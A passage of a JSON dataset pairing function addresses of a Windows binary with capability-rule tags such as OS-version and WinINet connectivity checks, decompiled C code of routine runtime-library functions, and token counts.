            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043b7f7(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 8) == '\\0') {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *(param_1 + 4) = 0;\n        *(param_1 + 8) = 1;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        return 0;\n    }\n    return *(param_1 + 4);\n}\n",
        "token_count": 119
    },
    "0043b84d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043b84d(uint *param_1)\n\n{\n    uint uVar1;\n    uint *dwErrCode;\n    \n    dwErrCode = param_1;\n    dwErrCode = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (*(param_1 + 2) == '\\0') {\n        uVar1 = 0;\n        *(param_1 + 2) = 1;\n        param_1[1] = 0;\n    }\n    else {\n        uVar1 = param_1[1];\n    }\n    uVar1 = fcn.0045d065(&dwErrCode, uVar1);\n    *param_1 = uVar1;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(dwErrCode);\n    return uVar1;\n}\n",
        "token_count": 177
    },
    "0043b89e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043b89e(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*param_1 == 0) {\n        iVar2 = fcn.0043b84d();\n        if (iVar2 == 0) {\n            fcn.0045ad41();\n            pcVar1 = swi(3);\n            iVar2 = (*pcVar1)();\n            return iVar2;\n        }\n    }\n    return *param_1;\n}\n",
        "token_count": 117
    },
    "0043c636": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0043c636(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = arg_18h;\n        var_18h = &arg_8h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        var_ch = arg_10h;\n        uVar1 = fcn.0043c328(&var_ch, &var_20h);\n        return uVar1;\n    }\n    *(arg_18h + 0x1c) = 1;\n    *(arg_18h + 0x18) = 0x16;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_18h);\n    return 0xffffffff;\n}\n",
        "token_count": 342
    },
    "0043c6a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0043c6a8(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = arg_18h;\n        var_18h = &arg_8h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        var_ch = arg_10h;\n        uVar1 = fcn.0043c439(&var_ch, &var_20h);\n        return uVar1;\n    }\n    *(arg_18h + 0x1c) = 1;\n    *(arg_18h + 0x18) = 0x16;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_18h);\n    return 0xffffffff;\n}\n",
        "token_count": 344
    },
    "0043c71a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0043c71a(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = arg_18h;\n        var_18h = &arg_8h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        var_ch = arg_10h;\n        uVar1 = fcn.0043c494(&var_ch, &var_20h);\n        return uVar1;\n    }\n    *(arg_18h + 0x1c) = 1;\n    *(arg_18h + 0x18) = 0x16;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_18h);\n    return 0xffffffff;\n}\n",
        "token_count": 343
    },
    "0043c78c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0043c78c(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = arg_18h;\n        var_18h = &arg_8h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        var_ch = arg_10h;\n        uVar1 = fcn.0043c383(&var_ch, &var_20h);\n        return uVar1;\n    }\n    *(arg_18h + 0x1c) = 1;\n    *(arg_18h + 0x18) = 0x16;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_18h);\n    return 0xffffffff;\n}\n",
        "token_count": 343
    },
    "0043c7fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0043c7fe(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = arg_18h;\n        var_18h = &arg_8h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        var_ch = arg_10h;\n        uVar1 = fcn.0043c3de(&var_ch, &var_20h);\n        return uVar1;\n    }\n    *(arg_18h + 0x1c) = 1;\n    *(arg_18h + 0x18) = 0x16;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_18h);\n    return 0xffffffff;\n}\n",
        "token_count": 344
    },
    "0043c870": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0043c870(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = arg_18h;\n        var_18h = &arg_8h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        var_ch = arg_10h;\n        uVar1 = fcn.0043c2cd(&var_ch, &var_20h);\n        return uVar1;\n    }\n    *(arg_18h + 0x1c) = 1;\n    *(arg_18h + 0x18) = 0x16;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_18h);\n    return 0xffffffff;\n}\n",
        "token_count": 343
    },
    "0043c9e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0043c9e3(uint arg_8h, uint arg_ch, ushort *arg_10h, uint32_t arg_14h, uint32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, uint arg_24h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_1ch == 0) {\n        *(arg_20h + 0x1c) = 1;\n        *(arg_20h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_20h);\n        return -1;\n    }\n    if (arg_18h == 0) {\n        if (arg_10h == NULL) {\n            if (arg_14h == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0043ca40:\n            if (arg_14h != 0) {\n                uVar2 = *(arg_20h + 0x18);\n                uVar3 = *(arg_20h + 0x1c);\n                if (arg_18h < arg_14h) {\n                    iVar4 = fcn.0043cc69(arg_8h, arg_ch, arg_10h, arg_18h + 1, arg_1ch, arg_20h, arg_24h);\n                    if (iVar4 == -2) {\n                        cVar1 = *(arg_20h + 0x1c);\ncode_r0x0043caa5:\n                        if (cVar1 == '\\0') {\n                            return -1;\n                        }\n                        if (*(arg_20h + 0x18) != 0x22) {\n                            return -1;\n                        }\n                        *(arg_20h + 0x18) = uVar2;\n                        *(arg_20h + 0x1c) = uVar3;\n                        return -1;\n                    }\ncode_r0x0043cabb:\n                    if (-1 < iVar4) {\n                        return iVar4;\n                    }\n                }\n                else {\n                    iVar4 = fcn.0043cc69(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, arg_24h);\n                    arg_10h[arg_14h - 1] = 0;\n                    if (iVar4 != -2) goto code_r0x0043cabb;\n                    if (arg_18h == 0xffffffff) {\n                        cVar1 = *(arg_20h + 0x1c);\n                        goto code_r0x0043caa5;\n                    }\n                }\n                *arg_10h = 0;\n                if (iVar4 != -2) {\n                    return -1;\n                }\n                *(arg_20h + 0x18) = 0x22;\n                goto code_r0x0043cad9;\n            }\n        }\n    }\n    else if (arg_10h != NULL) goto code_r0x0043ca40;\n    *(arg_20h + 0x18) = 0x16;\ncode_r0x0043cad9:\n    *(arg_20h + 0x1c) = 1;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_20h);\n    return -1;\n}\n",
        "token_count": 796
    },
    "0043d42c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0043d42c(uint arg_8h, uint arg_ch, uchar *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_18h == 0) {\n        *(arg_1ch + 0x1c) = 1;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n    }\n    else {\n        if ((arg_10h == NULL) || (arg_14h == 0)) {\n            *(arg_1ch + 0x1c) = 1;\n            *(arg_1ch + 0x18) = 0x16;\n        }\n        else {\n            iVar1 = fcn.0043caf5(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (iVar1 < 0) {\n                *arg_10h = 0;\n            }\n            if (iVar1 != -2) {\n                return iVar1;\n            }\n            *(arg_1ch + 0x1c) = 1;\n            *(arg_1ch + 0x18) = 0x22;\n        }\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n    }\n    return -1;\n}\n",
        "token_count": 367
    },
    "0043d4cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0043d4cb(uint arg_8h, uint arg_ch, ushort *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_18h == 0) {\n        *(arg_1ch + 0x1c) = 1;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n    }\n    else {\n        if ((arg_10h == NULL) || (arg_14h == 0)) {\n            *(arg_1ch + 0x1c) = 1;\n            *(arg_1ch + 0x18) = 0x16;\n        }\n        else {\n            iVar1 = fcn.0043cc69(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (iVar1 < 0) {\n                *arg_10h = 0;\n            }\n            if (iVar1 != -2) {\n                return iVar1;\n            }\n            *(arg_1ch + 0x1c) = 1;\n            *(arg_1ch + 0x18) = 0x22;\n        }\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n    }\n    return -1;\n}\n",
        "token_count": 367
    },
    "0043d5b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043d5b0(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x80000000) {\n        arg_8h = arg_8h * 2;\n        if (((*(in_ECX + 0x404) != 0) || (0x400 < arg_8h)) &&\n           (*(in_ECX + 0x400) <= arg_8h && arg_8h != *(in_ECX + 0x400))) {\n            var_4h = fcn.0045d1bf(arg_8h);\n            if (var_4h == 0) {\n                fcn.0045d185(0);\n                return 0;\n            }\n            fcn.004473f0(&var_4h);\n            *(in_ECX + 0x400) = arg_8h;\n            fcn.0045d185(var_4h);\n        }\n        uVar1 = 1;\n    }\n    else {\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 0xc;\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 299
    },
    "0043d631": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043d631(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x40000000) {\n        arg_8h = arg_8h << 2;\n        if (((*(in_ECX + 0x404) != 0) || (0x400 < arg_8h)) &&\n           (*(in_ECX + 0x400) <= arg_8h && arg_8h != *(in_ECX + 0x400))) {\n            var_4h = fcn.0045d1bf(arg_8h);\n            if (var_4h == 0) {\n                fcn.0045d185(0);\n                return 0;\n            }\n            fcn.004473f0(&var_4h);\n            *(in_ECX + 0x400) = arg_8h;\n            fcn.0045d185(var_4h);\n        }\n        uVar1 = 1;\n    }\n    else {\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 0xc;\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 297
    },
    "0043d6b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043d6b3(int32_t *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        pcVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = pcVar2 + 4;\n        cVar1 = *pcVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar4 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 415
    },
    "0043d742": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043d742(int32_t *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        pcVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = pcVar2 + 4;\n        cVar1 = *pcVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar4 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 414
    },
    "0043d7d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043d7d1(int32_t *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        pcVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = pcVar2 + 4;\n        cVar1 = *pcVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar4 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 396
    },
    "0043d861": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043d861(int32_t *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        pcVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = pcVar2 + 4;\n        cVar1 = *pcVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar4 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 395
    },
    "0043d971": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043d971(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 4;\n        uVar1 = *puVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar4 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 401
    },
    "0043da00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043da00(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 4;\n        uVar1 = *puVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar4 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 402
    },
    "0043da8f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043da8f(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 4;\n        uVar1 = *puVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar4 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 383
    },
    "0043db1f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043db1f(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 4;\n        uVar1 = *puVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar4 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 384
    },
    "0043dc2f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
